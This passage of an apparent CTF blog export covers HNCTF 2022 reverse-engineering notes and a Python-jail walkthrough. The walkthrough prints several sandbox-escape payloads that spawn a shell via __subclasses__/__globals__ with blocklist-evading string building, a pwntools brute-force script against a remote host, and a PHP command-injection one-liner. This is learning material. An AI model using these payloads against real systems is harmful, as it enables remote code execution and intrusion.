src="/2022/11/02/hnctfRe/dynamic_3.png" alt="dynamic_3"><br><img src="/2022/11/02/hnctfRe/dynamic_4.png" alt="dynamic_4"><br><img src="/2022/11/02/hnctfRe/dynamic_5.png" alt="dynamic_5"></p>
<h5 id="And-so-on…"><a href="#And-so-on…" class="headerlink" title="And so on…"></a>And so on…</h5><pre><code>###### Two thinkings(should be tried out later):
###### Can `angr` solve `rc4` immediately?
###### Can I add a `hook` so it prints the `ECX` rightaway and I don&#39;t need to check it once and once again?
######                                                                                          --2022.11.4
</code></pre>
<h4 id="From-here-the-last-few-problems-are-quite-hard…"><a href="#From-here-the-last-few-problems-are-quite-hard…" class="headerlink" title="From here, the last few problems are quite hard…"></a>From here, the last few problems are quite hard…</h4><h3 id="MAZE"><a href="#MAZE" class="headerlink" title="MAZE"></a>MAZE</h3><h5 id="We-found-thounds-of-junkcodes-here-and-we-nop-them"><a href="#We-found-thounds-of-junkcodes-here-and-we-nop-them" class="headerlink" title="We found thounds of junkcodes here, and we nop them:"></a>We found thounds of junkcodes here, and we nop them:</h5><pre><code>import idc
import idautils
start =0x00140001000
end = 0x00140CEF1F0
bad=[0x50,0x48,0x0f,0xc7,0xf0,0x58]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0x50:
        flag=1
        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>capstone</title>
    <url>/2022/11/06/capstone/</url>
    <content><![CDATA[<h6 id="Preface"><a href="#Preface" class="headerlink" title="Preface:"></a>Preface:</h6><h6 id="A-write-up-in-hnctf-use-capstone-to-solved-the-problem-maze-It’s-the-first-time-I-heard-of-it-so-I-am-writing-to-this-blog-for-later-review"><a href="#A-write-up-in-hnctf-use-capstone-to-solved-the-problem-maze-It’s-the-first-time-I-heard-of-it-so-I-am-writing-to-this-blog-for-later-review" class="headerlink" title="A write up in hnctf use capstone to solved the problem maze. It’s the first time I heard of it, so I am writing to this blog for later review."></a>A write up in hnctf use <code>capstone</code> to solved the problem <code>maze</code>. It’s the first time I heard of it, so I am writing to this blog for later review.</h6><h5 id="Most-thing-I-write-can-be-found-in-Official-file"><a href="#Most-thing-I-write-can-be-found-in-Official-file" class="headerlink" title="Most thing I write can be found in Official file."></a>Most thing I write can be found in <a href="http://www.capstone-engine.org/lang_python.html">Official file</a>.</h5><span id="more"></span>
<h5 id="An-example-you-can-try-before-reading"><a href="#An-example-you-can-try-before-reading" class="headerlink" title="An example you can try before reading:"></a>An example you can try before reading:</h5><pre><code># test1.py
from capstone import *

CODE = b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;

md = Cs(CS_ARCH_X86, CS_MODE_64)
for i in md.disasm(CODE, 0x1000):
    print(&quot;0x%x:\t%s\t%s&quot; %(i.address, i.mnemonic, i.op_str))

# It&#39;s the official example, you can try to change the CODE and see what happens.(Such as add a few &#39;\x55&#39; or &#39;\x48&#39; or whatever you like)
</code></pre>
<h5 id="Trying-this-problem-you-get-the-basic-idea-how-capstone-or-rather-how-a-exe-file-works-It-translate-the-binary-numbers-into-assembly-language-in-a-queue-and-when-you-add-some-thing-the-whole-procedure-might-when-wrong-You-may-think-thit-is-simple-but-some-time-we-just-didn’t-remember-to-relate-the-whole-file-with-simple-binary-numbers-like-wht-upper-CODE"><a href="#Trying-this-problem-you-get-the-basic-idea-how-capstone-or-rather-how-a-exe-file-works-It-translate-the-binary-numbers-into-assembly-language-in-a-queue-and-when-you-add-some-thing-the-whole-procedure-might-when-wrong-You-may-think-thit-is-simple-but-some-time-we-just-didn’t-remember-to-relate-the-whole-file-with-simple-binary-numbers-like-wht-upper-CODE" class="headerlink" title="Trying this problem, you get the basic idea how capstone, or rather, how a .exe file works. It translate the binary numbers into assembly language in a queue, and when you add some thing, the whole procedure might when wrong.(You may think thit is simple, but some time we just didn’t remember to relate the whole file with simple binary numbers like wht upper CODE)"></a>Trying this problem, you get the basic idea how capstone, or rather, how a <code>.exe</code> file works. It translate the binary numbers into assembly language in a queue, and when you add some thing, the whole procedure might when wrong.(You may think thit is simple, but some time we just didn’t remember to relate the whole file with simple binary numbers like wht upper <code>CODE</code>)</h5><h5 id="We-need-to-know-what-does-the-function-mean"><a href="#We-need-to-know-what-does-the-function-mean" class="headerlink" title="We need to know what does the function mean:"></a>We need to know what does the function mean:</h5><p>~to be continue</p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>pythonJail</title>
    <url>/2022/11/01/pythonJail/</url>
    <content><![CDATA[<h4 id="preface"><a href="#preface" class="headerlink" title="preface"></a>preface</h4><h5 id="Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail"><a href="#Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail" class="headerlink" title="Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problemspythonJail."></a>Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems<a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">pythonJail</a>.</h5><span id="more"></span>
<h3 id="LEVEL-1"><a href="#LEVEL-1" class="headerlink" title="LEVEL 1"></a>LEVEL 1</h3><p><img src="/2022/11/01/pythonJail/level1.png" alt="level1"></p>
<h5 id="From-the-function-filter-we-sees-that-the-symbol-“-‘-i-b-is-banned-Which-means-Show-subclasses-with-tuple-class-base-subclasses"><a href="#From-the-function-filter-we-sees-that-the-symbol-“-‘-i-b-is-banned-Which-means-Show-subclasses-with-tuple-class-base-subclasses" class="headerlink" title="From the function filter, we sees that the symbol [“ ‘ ` i b] is banned. Which means (Show subclasses with tuple)  ().\__class\__.\__base\__.\__subclasses\__()"></a>From the function filter, we sees that the symbol [“ ‘ ` i b] is banned. Which means (Show subclasses with tuple) <code> ().\__class\__.\__base\__.\__subclasses\__()</code></h5><h5 id="is-not-allowed-What’s-more-symbol-‘-and-“-is-banned-so-it-come-to-us-that-we-may-can-use-chr-to-splicing-a-string-that-we-wanted"><a href="#is-not-allowed-What’s-more-symbol-‘-and-“-is-banned-so-it-come-to-us-that-we-may-can-use-chr-to-splicing-a-string-that-we-wanted" class="headerlink" title="is not allowed. What’s more, symbol ‘ and “ is banned, so it come to us that we may can use chr to splicing a string that we wanted."></a>is not allowed. What’s more, symbol ‘ and “ is banned, so it come to us that we may can use <code>chr</code> to splicing a string that we wanted.</h5><h5 id="Two-possible-payload"><a href="#Two-possible-payload" class="headerlink" title="Two possible payload:"></a>Two possible payload:</h5><blockquote>
<p>getattr(getattr(getattr(getattr(()._<em>class_</em>,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))<br>(().<em>_class</em><em>.__base</em><em>.__subclasses__()[-4].__init__.__globals</em>_<a href="'sh'">‘system’</a>)</p>
</blockquote>
<blockquote>
<p>open(chr(102)+chr(108)+chr(97)+chr(103)).read()</p>
</blockquote>
<h5 id="from-thisBlog"><a href="#from-thisBlog" class="headerlink" title="from thisBlog"></a>from <a href="https://zhuanlan.zhihu.com/p/578986988">thisBlog</a></h5><p><img src="/2022/11/01/pythonJail/level1wp.png" alt="level1pos"></p>
<h3 id="LEVEL-2"><a href="#LEVEL-2" class="headerlink" title="LEVEL 2"></a>LEVEL 2</h3><p><img src="/2022/11/01/pythonJail/level2.png" alt="level1"></p>
<h5 id="The-length-of-the-payload-is-limited-to-13"><a href="#The-length-of-the-payload-is-limited-to-13" class="headerlink" title="The length of the payload is limited to 13."></a>The length of the payload is limited to 13.</h5><h5 id="The-answer-according-to-空白-is-the-function-“breakpoint-”-which-I-didn’t-figure-out-yet-However-there-is-another-way-Use-eval-input-so-that-the-program-receive-once-again-for-your-input-Seems-a-little-bit-like-cmd-system-POST-1-1-ls-to-escape-the-filter-in-php-right"><a href="#The-answer-according-to-空白-is-the-function-“breakpoint-”-which-I-didn’t-figure-out-yet-However-there-is-another-way-Use-eval-input-so-that-the-program-receive-once-again-for-your-input-Seems-a-little-bit-like-cmd-system-POST-1-1-ls-to-escape-the-filter-in-php-right" class="headerlink" title="The answer according to 空白 is the function “breakpoint()”, which I didn’t figure out yet. However, there is another way. Use eval(input()) so that the program receive once again for your input! Seems a little bit like /?cmd=system($_POST[1]);$1=ls to escape the filter in php right?"></a>The answer according to 空白 is the function <c style="color: #FF0000">“breakpoint()”</c>, which I didn’t figure out yet. However, there is another way. Use <code>eval(input())</code> so that the program receive once again for your input! Seems a little bit like <code>/?cmd=system($_POST[1]);$1=ls</code> to escape the filter in php right?</h5><h3 id="LEVEL-3"><a href="#LEVEL-3" class="headerlink" title="LEVEL 3"></a>LEVEL 3</h3><p><img src="/2022/11/01/pythonJail/level3.png" alt="level3"></p>
<h5 id="This-time-the-maximum-length-of-our-payload-is-down-to-7"><a href="#This-time-the-maximum-length-of-our-payload-is-down-to-7" class="headerlink" title="This time, the maximum length of our payload is down to 7."></a>This time, the maximum length of our payload is down to 7.</h5><h5 id="I-didn’t-quite-understand-yet-but-function-help-can-help-you-passby-the-7-words-limit-Here-is-when-I-tried-others’-payload-quite-amazing-and-when-I-am-available-I-shall-come-back-to-study-it"><a href="#I-didn’t-quite-understand-yet-but-function-help-can-help-you-passby-the-7-words-limit-Here-is-when-I-tried-others’-payload-quite-amazing-and-when-I-am-available-I-shall-come-back-to-study-it" class="headerlink" title="I didn’t quite understand yet, but function help() can help you passby the 7 words limit. Here is when I tried others’ payload, quite amazing and when I am available I shall come back to study it."></a>I didn’t quite understand yet, but function <code>help()</code> can help you passby the 7 words limit. Here is when I tried others’ payload, quite amazing and when I am available I shall come back to study it.</h5><blockquote>
</blockquote>
<p><img src="/2022/11/01/pythonJail/level3wp.png" alt="level3"></p>
<h3 id="PYTHON2-INPUT-JAIL"><a href="#PYTHON2-INPUT-JAIL" class="headerlink" title="PYTHON2 INPUT JAIL"></a>PYTHON2 INPUT JAIL</h3><p><img src="/2022/11/01/pythonJail/input(jail).png" alt="input(jail)"></p>
<h5 id="python2-another-thing-I-am-not-familiar-with…"><a href="#python2-another-thing-I-am-not-familiar-with…" class="headerlink" title="python2, another thing I am not familiar with…"></a>python2, another thing I am not familiar with…</h5><h5 id="Looking-up-others’-write-up…"><a href="#Looking-up-others’-write-up…" class="headerlink" title="Looking up others’ write up…"></a>Looking up others’ write up…</h5><p><img src="/2022/11/01/pythonJail/input(jail)wp.png" alt="input(jail)"></p>
<h3 id="LEVEL-2-5"><a href="#LEVEL-2-5" class="headerlink" title="LEVEL 2.5"></a>LEVEL 2.5</h3><p><img src="/2022/11/01/pythonJail/level2.5.png" alt="level2.5"></p>
<h5 id="We-can-use-breakpoint-to-go-into-pdb-and-rce-is-possible"><a href="#We-can-use-breakpoint-to-go-into-pdb-and-rce-is-possible" class="headerlink" title="We can use breakpoint() to go into pdb, and rce is possible."></a>We can use <code>breakpoint()</code> to go into pdb, and rce is possible.</h5><h3 id="LAKE"><a href="#LAKE" class="headerlink" title="LAKE"></a>LAKE</h3><p><img src="/2022/11/01/pythonJail/lake.png" alt="lake"></p>
<h6 id="Strange-christen-Crazyman-seems-to-name-it-‘lake’-from-‘leak’"><a href="#Strange-christen-Crazyman-seems-to-name-it-‘lake’-from-‘leak’" class="headerlink" title="Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)"></a>Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)</h6><h5 id="Use-globals-to-leak-the-key-And-then-get-shell"><a href="#Use-globals-to-leak-the-key-And-then-get-shell" class="headerlink" title="Use globals() to leak the key. And then get shell."></a>Use <code>globals()</code> to leak the key. And then get shell.</h5><h3 id="L-KE"><a href="#L-KE" class="headerlink" title="L@KE"></a>L@KE</h3><p><img src="/2022/11/01/pythonJail/l@ke.png" alt="l@ke"></p>
<h6 id="Another-strange-christen…"><a href="#Another-strange-christen…" class="headerlink" title="Another strange christen…"></a>Another strange christen…</h6><h5 id="The-maxinum-length-of-payload-is-now-6-so-only-help-is-possible"><a href="#The-maxinum-length-of-payload-is-now-6-so-only-help-is-possible" class="headerlink" title="The maxinum length of payload is now 6, so only help() is possible."></a>The maxinum length of payload is now 6, so only <code>help()</code> is possible.</h5><h5 id="But-unlike-cases-above-this-time-module-‘os’-is-destory-or-whatever-Now-we-comes-to-the-base-reason-why-we-use-‘os’-above-help-can-actually-get-you-into-any-module-in-the-python-file-which-includes-main-And-surely-the-key-can-be-found-inside"><a href="#But-unlike-cases-above-this-time-module-‘os’-is-destory-or-whatever-Now-we-comes-to-the-base-reason-why-we-use-‘os’-above-help-can-actually-get-you-into-any-module-in-the-python-file-which-includes-main-And-surely-the-key-can-be-found-inside" class="headerlink" title="But unlike cases above, this time module ‘os’ is destory or whatever. Now we comes to the base reason why we use ‘os’ above. help() can actually get you into any module in the python file, which includes __main__! And surely, the key can be found inside."></a>But unlike cases above, this time module ‘os’ is destory or whatever. Now we comes to the base reason why we use ‘os’ above. <code>help()</code> can actually get you into any module in the python file, which includes <code>__main__</code>! And surely, the key can be found inside.</h5><br>
#### OK, now we've go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.
<br>


<h3 id="LEVEL-5"><a href="#LEVEL-5" class="headerlink" title="LEVEL 5"></a>LEVEL 5</h3><p><img src="/2022/11/01/pythonJail/level5.png" alt="level5"></p>
<h5 id="Just-rce-can-give-you-the-flag-unexpected-Later-we-will-see-how-it-shall-really-be-work-out"><a href="#Just-rce-can-give-you-the-flag-unexpected-Later-we-will-see-how-it-shall-really-be-work-out" class="headerlink" title="Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out."></a>Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out.</h5><h3 id="LEVEL-4"><a href="#LEVEL-4" class="headerlink" title="LEVEL 4"></a>LEVEL 4</h3><h6 id="Why-is-it-4-after-5-I-don’t-know…"><a href="#Why-is-it-4-after-5-I-don’t-know…" class="headerlink" title="(Why is it 4 after 5 I don’t know…)"></a>(Why is it 4 after 5 I don’t know…)</h6><h5 id="4-bytes-rce-seems-impossible-so-lets-just-guass-it-use-os-system-input-data-to-get-your-input-and-bingo"><a href="#4-bytes-rce-seems-impossible-so-lets-just-guass-it-use-os-system-input-data-to-get-your-input-and-bingo" class="headerlink" title="4 bytes rce, seems impossible, so lets just guass it use os.system(input_data) to get your input and bingo."></a>4 bytes rce, seems impossible, so lets just guass it use <code>os.system(input_data)</code> to get your input and bingo.</h5><p><img src="/2022/11/01/pythonJail/level4.png" alt="level4"></p>
<h3 id="LAkE"><a href="#LAkE" class="headerlink" title="LAkE"></a>LAkE</h3><p><img src="/2022/11/01/pythonJail/laKelaKe.png" alt="laKe"></p>
<h5 id="This-time-it-imports-sys-module-with-audit-hook-and-direct-RCE-function-like-pty-spawn、os-system、os-exec、os-posix-spawn、os-spawn、subprocess-Popen-is-not-available-Whats-more-compile、eval、exec、open-is-unfetchable-However-there-use-random-setstate-to-generate-its-random-number-which-is-base-on-Mersenne-Twister-and-is-crackable-In-general-if-we-got-the-state-of-the-random-number-generator-we-can-generate-the-same-number-That-leads-two-problems-There-is-only-one-‘eval’-in-the-server-code-but-we-need-to-execute-more-How-to-restore-the-state-BEFORE-the-random-number-is-generated"><a href="#This-time-it-imports-sys-module-with-audit-hook-and-direct-RCE-function-like-pty-spawn、os-system、os-exec、os-posix-spawn、os-spawn、subprocess-Popen-is-not-available-Whats-more-compile、eval、exec、open-is-unfetchable-However-there-use-random-setstate-to-generate-its-random-number-which-is-base-on-Mersenne-Twister-and-is-crackable-In-general-if-we-got-the-state-of-the-random-number-generator-we-can-generate-the-same-number-That-leads-two-problems-There-is-only-one-‘eval’-in-the-server-code-but-we-need-to-execute-more-How-to-restore-the-state-BEFORE-the-random-number-is-generated" class="headerlink" title="This time it imports sys module with audit hook, and direct RCE function like pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen is not available. Whats more, compile、eval、exec、open is unfetchable. However, there use random.setstate() to generate its random number, which is base on Mersenne Twister, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one ‘eval’ in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?"></a>This time it imports <code>sys</code> module with <a href="https://peps.python.org/pep-0578/">audit hook</a>, and direct RCE function like <code>pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen</code> is not available. Whats more, <code>compile、eval、exec、open</code> is unfetchable. However, there use <code>random.setstate()</code> to generate its random number, which is base on Mersenne <a href="https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95">Twister</a>, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one ‘eval’ in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?</h5><h5 id="First-we-need-to-know-a-thing-named-Assignment-Expresions-in-python-or-rather-walrus-operator-Then-we-package-those-formula-in-a-list-They-will-be-calculate-from-left-to-right-As-for-function-we-can-replace-it-with-lambda-Some-case-can-be-view-below"><a href="#First-we-need-to-know-a-thing-named-Assignment-Expresions-in-python-or-rather-walrus-operator-Then-we-package-those-formula-in-a-list-They-will-be-calculate-from-left-to-right-As-for-function-we-can-replace-it-with-lambda-Some-case-can-be-view-below" class="headerlink" title="First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with lambda. Some case can be view below:"></a>First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with <code>lambda</code>. Some case can be view below:</h5><pre><code>https://ctftime.org/writeup/21982

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#operators-and-short-tricks
</code></pre>
<h5 id="Second-if-we-import-random-and-print-random-getstate-at-the-beginning-we-got-a-tuple-back-which-may-look-like-3-624-None-The-first-value-‘3’-and-the-last-value-‘None’-is-fixed-Only-624-numbers-in-the-middle-is-changed-So-if-we-assign-the-conter-zero-we-get-the-random-number"><a href="#Second-if-we-import-random-and-print-random-getstate-at-the-beginning-we-got-a-tuple-back-which-may-look-like-3-624-None-The-first-value-‘3’-and-the-last-value-‘None’-is-fixed-Only-624-numbers-in-the-middle-is-changed-So-if-we-assign-the-conter-zero-we-get-the-random-number" class="headerlink" title="Second, if we import random and print random.getstate at the beginning, we got a tuple back. which may look like:(3, (..., 624), None). The first value ‘3’ and the last value ‘None’ is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number."></a>Second, if we <code>import random</code> and print <code>random.getstate</code> at the beginning, we got a tuple back. which may look like:<code>(3, (..., 624), None)</code>. The first value ‘3’ and the last value ‘None’ is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.</h5><h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><pre><code>[random:=\_\_import__(&#39;random&#39;), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
</code></pre>
<h3 id="LEVEL-5-1"><a href="#LEVEL-5-1" class="headerlink" title="LEVEL 5.1"></a>LEVEL 5.1</h3><h5 id="Dued-to-the-unexpected-solves-in-level5-crazyman-gives-another-problem-stating-level5-1"><a href="#Dued-to-the-unexpected-solves-in-level5-crazyman-gives-another-problem-stating-level5-1" class="headerlink" title="Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1."></a>Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1.</h5><h5 id="nc-and-dir-as-it-tells-you-to-found-my-flag-try-list-getattr-my-flag-39-flag-got-a-AttributeError-39-flag-level5-39-object-has-no-attribute-39-flag-39-So-payload-is-list-getattr-my-flag-39-flag-level5-39"><a href="#nc-and-dir-as-it-tells-you-to-found-my-flag-try-list-getattr-my-flag-39-flag-got-a-AttributeError-39-flag-level5-39-object-has-no-attribute-39-flag-39-So-payload-is-list-getattr-my-flag-39-flag-level5-39" class="headerlink" title="nc and dir()(as it tells you to), found my_flag, try list(getattr(my_flag,&#39;flag)), got a AttributeError: &#39;flag_level5&#39; object has no attribute &#39;flag&#39;. So payload is list(getattr(my_flag,&#39;flag_level5&#39;))"></a><code>nc</code> and <code>dir()</code>(as it tells you to), found <code>my_flag</code>, try <code>list(getattr(my_flag,&#39;flag))</code>, got a <code>AttributeError: &#39;flag_level5&#39; object has no attribute &#39;flag&#39;</code>. So payload is <code>list(getattr(my_flag,&#39;flag_level5&#39;))</code></h5><h5 id="Another-way-to-solve-this-problem-though-quite-similar-the-latter-gets-its-shell"><a href="#Another-way-to-solve-this-problem-though-quite-similar-the-latter-gets-its-shell" class="headerlink" title="Another way to solve this problem(though quite similar, the latter gets its shell)"></a>Another way to solve this problem(though quite similar, the latter gets its shell)</h5><p><img src="/2022/11/01/pythonJail/level5.1_1.png" alt="level5.1_1"><br><img src="/2022/11/01/pythonJail/level5.1_2.png" alt="level5.1_2"></p>
<h3 id="LAK3"><a href="#LAK3" class="headerlink" title="LAK3"></a>LAK3</h3><p><img src="/2022/11/01/pythonJail/lak3.png" alt="lak3"></p>
<h5 id="Same-as-before-we-can-use-the-excate-same-payload-Though-the-official-payload-provides-by-crazyman-is-import-39-sys-39-getframe-1-f-locals-39-right-guesser-question-answer-39"><a href="#Same-as-before-we-can-use-the-excate-same-payload-Though-the-official-payload-provides-by-crazyman-is-import-39-sys-39-getframe-1-f-locals-39-right-guesser-question-answer-39" class="headerlink" title="Same as before, we can use the excate same payload. Though the official payload provides by crazyman is __import__(&#39;sys&#39;)._getframe(1).f_locals[&#39;right_guesser_question_answer&#39;]"></a>Same as before, we can use the excate same payload. Though the official payload provides by crazyman is <code>__import__(&#39;sys&#39;)._getframe(1).f_locals[&#39;right_guesser_question_answer&#39;]</code></h5><h5 id="a-good-blog-can-refer"><a href="#a-good-blog-can-refer" class="headerlink" title="a good blog can refer"></a><a href="https://ctftime.org/writeup/21982">a good blog can refer</a></h5><h3 id="tyPe-Ch-nnEl"><a href="#tyPe-Ch-nnEl" class="headerlink" title="tyPe Ch@nnEl"></a>tyPe Ch@nnEl</h3><p><img src="/2022/11/01/pythonJail/sideChannel.png" alt="sideChannel"></p>
<h5 id="I-haven’t-quite-understand-yet-So-I-will-put-the-payload-beforehand"><a href="#I-haven’t-quite-understand-yet-So-I-will-put-the-payload-beforehand" class="headerlink" title="I haven’t quite understand yet. So I will put the payload beforehand:"></a>I haven’t quite understand yet. So I will put the payload beforehand:</h5><h5 id="One-possible"><a href="#One-possible" class="headerlink" title="One possible:"></a>One possible:</h5><pre><code>from pwn import *
from tqdm import trange

class Gao:
    def __init__(self):
        self.known = &#39;&#39;

def init(self):
    # self.conn = process([&#39;python3&#39;, &#39;./server_type.py&#39;])
    self.conn = remote(&#39;1.14.71.254&#39;, 28563)

def gao(self):
    payload = &#39;((1)if(type(flag.split())(flag.encode()).pop(&#123;pos&#125;)^&#123;val&#125;)else(True))&#39;
    i = len(self.known)
    while True:
        for j in trange(32, 128):
            cur_payload = payload.format(pos=i, val=j)
            self.init()
            self.conn.sendlineafter(&#39;Payload:&#39;, cur_payload)
            s = self.conn.recvline()
            self.conn.close()
            if (b&#39;Try&#39; in s):
                return
            elif (b&#39;bool&#39; in s):
                self.known += chr(j)
                print(self.known)
                print(self.known)
                print(self.known)
                break
        else:
            raise Exception(&#39;GG simida&#39;)            
        i += 1
if __name__ == &#39;__main__&#39;:
    g = Gao()
    g.gao()
</code></pre>
<h5 id="↑-Can-took-some-time-when-I-tried"><a href="#↑-Can-took-some-time-when-I-tried" class="headerlink" title="↑ Can took some time(when I tried)"></a>↑ Can took some time(when I tried)</h5><h5 id="Officail"><a href="#Officail" class="headerlink" title="Officail:"></a>Officail:</h5><pre><code>for i in range(len(flag), len(flag)+100): # flag length
for guess in chars: # all possible chars
    print(&quot;guess: &quot;, bytes(flag), chr(guess))
    payload = f&quot;type(type(flag).mro())(type(type(flag).mro())(flag).pop(&#123;i&#125;).encode()).remove(&#123;guess&#125;)&quot;
</code></pre>
<h3 id="LEVEL-4-1"><a href="#LEVEL-4-1" class="headerlink" title="LEVEL 4"></a>LEVEL 4</h3><h6 id="level-4-again"><a href="#level-4-again" class="headerlink" title="level 4 again"></a>level 4 again</h6><p><img src="/2022/11/01/pythonJail/level4_1.png" alt="level4_1"></p>
<h5 id="Quite-similar-as-before-just-use-bytes-decode-to-pass-the-black-list"><a href="#Quite-similar-as-before-just-use-bytes-decode-to-pass-the-black-list" class="headerlink" title="Quite similar as before, just use bytes().decode() to pass the black list."></a>Quite similar as before, just use <code>bytes().decode()</code> to pass the black list.</h5><p><img src="/2022/11/01/pythonJail/level4wp1.png" alt="level4_1wp1"><br><img src="/2022/11/01/pythonJail/level4wp2.png" alt="level4_1wp2"></p>
<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h5><pre><code>().__class__.__base__.__subclasses__()
</code></pre>
<h5 id><a href="#" class="headerlink" title></a></h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())
</code></pre>
<h5 id="There-is-another-solution-to-this-problem-I-am-not-sure-I-fully-understand-it-so-I-put-a-link-here-beforehand"><a href="#There-is-another-solution-to-this-problem-I-am-not-sure-I-fully-understand-it-so-I-put-a-link-here-beforehand" class="headerlink" title="There is another solution to this problem: I am not sure I fully understand it, so I put a link here beforehand."></a>There is another solution to this problem: I am not sure I fully understand it, so I put a <a href="https://zhuanlan.zhihu.com/p/579057932">link</a> here beforehand.</h5><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
</code></pre>
<p><img src="/2022/11/01/pythonJail/level4wp_3.png" alt="level4wp3"></p>
<h3 id="LEVEL-4-0-5"><a href="#LEVEL-4-0-5" class="headerlink" title="LEVEL 4.0.5"></a>LEVEL 4.0.5</h3><h5 id="Same-payload-as-last-one"><a href="#Same-payload-as-last-one" class="headerlink" title="Same payload as last one."></a>Same payload as last one.</h5><p><img src="/2022/11/01/pythonJail/level4.0.5.png" alt="level4.0.5"></p>
<h3 id="LEVEL-4-1"><a href="#LEVEL-4-1" class="headerlink" title="LEVEL 4.1"></a>LEVEL 4.1</h3><h5 id="Quite-same-as-before"><a href="#Quite-same-as-before" class="headerlink" title="Quite same as before."></a>Quite same as before.</h5><p><img src="/2022/11/01/pythonJail/level4.1wp1.png" alt="level4.1"></p>
<h5 id="Ps-the-bytes-is-now-banned-but-still-you-can-use-show-subclassed-with-tuples-to-replace-like-this"><a href="#Ps-the-bytes-is-now-banned-but-still-you-can-use-show-subclassed-with-tuples-to-replace-like-this" class="headerlink" title="Ps, the bytes is now banned, but still you can use show subclassed with tuples to replace, like this:"></a>Ps, the <code>bytes</code> is now banned, but still you can use <code>show subclassed with tuples</code> to replace, like this:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
</code></pre>
<h3 id="LEVEL-4-2"><a href="#LEVEL-4-2" class="headerlink" title="LEVEL 4.2"></a>LEVEL 4.2</h3><h5 id="Quite-same-as-before-1"><a href="#Quite-same-as-before-1" class="headerlink" title="Quite same as before.."></a>Quite same as before..</h5><p><img src="/2022/11/01/pythonJail/level4.2wp.png" alt="level4.2"></p>
<h5 id="Or-rather-use-join"><a href="#Or-rather-use-join" class="headerlink" title="Or rather use join:"></a>Or rather use <code>join</code>:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
</code></pre>
<h3 id="LEVEL-4-3"><a href="#LEVEL-4-3" class="headerlink" title="LEVEL 4.3"></a>LEVEL 4.3</h3><h5 id="Quite-same-as-before…"><a href="#Quite-same-as-before…" class="headerlink" title="Quite same as before…"></a>Quite same as before…</h5><p><img src="/2022/11/01/pythonJail/level4.3wp.png" alt="level4.3"></p>
<br>
#### The next few levels are become harder and harder.
<br>

